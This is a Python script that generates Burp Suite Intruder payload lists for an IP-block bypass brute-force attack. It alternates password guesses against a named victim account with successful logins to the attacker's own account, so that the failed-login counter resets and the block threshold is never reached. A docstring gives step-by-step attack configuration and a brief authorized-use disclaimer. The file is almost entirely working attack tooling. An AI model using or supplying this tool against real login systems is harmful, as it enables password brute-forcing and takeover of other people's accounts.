#!/usr/bin/env python3
"""
Burp Intruder Payload Generator for IP-Based Rate Limit Bypass
===============================================================

This script generates two payload lists (usernames and passwords) for
Burp Suite Intruder's Pitchfork attack. The lists alternate between:

    1. Failed login attempts against a victim account.
    2. A successful login using credentials the attacker controls.

Why?
-----
Some web applications block an IP address after N failed login attempts,
but reset the failed-attempt counter to zero after ANY successful login
from that same IP. By alternating failed victim attempts with a successful
login on our own account, we never reach the block threshold, allowing us
to brute-force the victim's password.

Usage:
------
    1. Run the script: python3 ReganIpBlockBypass.py
    2. Answer the prompts
    3. Copy the printed username list into Burp Intruder Payload Set 1.
    4. Copy the printed password list into Burp Intruder Payload Set 2.
    5. Configure Burp Intruder as a Pitchfork attack.
    6. Set Resource Pool to 1 concurrent request to preserve order.

Disclaimer:
-----------
Use only on systems you own or have explicit written permission to test.
Unauthorized testing is illegal.
"""

def get_input(prompt, default=None):
    """Ask for user input with an optional default value."""
    if default:
        user_input = input(f"{prompt} [{default}]: ").strip()
        return user_input if user_input else default
    return input(f"{prompt}: ").strip()


def main():
    print("=" * 60)
    print("Burp Intruder Payload Generator – IP Block Bypass")
    print("=" * 60)

    # Target details
    victim_username = get_input(
        "Victim username/phone (the account you are attacking)",
        default="X"
    )
    valid_username = get_input(
        "Your valid username/phone (for reset login)",
        default="X"
    )
    valid_password = get_input(
        "Your valid password (for reset login)",
        default="X"
    )
    fails_allowed = int(get_input(
        "How many failed attempts before IP block?",
        default="X"
    ))
    fails_before_reset = fails_allowed - 1  # reset after this many failures

    # Password list input
    password_file = get_input(
        "Path to password file (or type 'manual' to enter manually)",
        default="passwords.txt"
    )
    if password_file.lower() == "manual":
        print("Enter victim password guesses (one per line). Type 'END' to finish:")
        passwords = []
        while True:
            line = input().strip()
            if line.lower() == "end":
                break
            if line:
                passwords.append(line)
    else:
        try:
            with open(password_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[!] File '{password_file}' not found. Exiting.")
            return

    if not passwords:
        print("[!] No passwords loaded. Exiting.")
        return

    # Build alternating lists
    usernames = []
    password_list = []
    i = 0  # count victim attempts since last reset

    for pwd in passwords:
        # Victim attempt
        usernames.append(victim_username)
        password_list.append(pwd)
        i += 1

        # Insert successful reset login after N failures
        if i == fails_before_reset:
            usernames.append(valid_username)
            password_list.append(valid_password)
            i = 0

    # Print results
    print("\n" + "#" * 30)
    print("### Username List ###")
    print("#" * 30)
    for u in usernames:
        print(u)

    print("\n" + "#" * 30)
    print("### Password List ###")
    print("#" * 30)
    for p in password_list:
        print(p)

    print("\n[+] Lists generated.")
    print("    Copy the usernames into Burp Intruder Payload Set 1.")
    print("    Copy the passwords into Burp Intruder Payload Set 2.")
    print("    Use Pitchfork attack and set Resource Pool to 1.")


if __name__ == "__main__":
    main()
